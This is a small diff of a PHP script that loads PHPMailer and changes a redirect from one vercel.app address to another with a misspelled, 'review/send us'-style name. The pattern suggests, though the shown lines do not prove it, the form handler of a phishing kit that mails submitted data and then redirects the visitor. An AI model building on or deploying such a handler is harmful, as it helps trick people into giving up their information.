@@ -2,7 +2,7 @@
 use PHPMailer\PHPMailer\PHPMailer;
 use PHPMailer\PHPMailer\Exception;
 
-header("Location: https://re-apply-here.vercel.app/");
+header("Location: https://rewview-re-sennd-us.vercel.app/");
 
 require 'Exception.php';
 require 'PHPMailer.php';
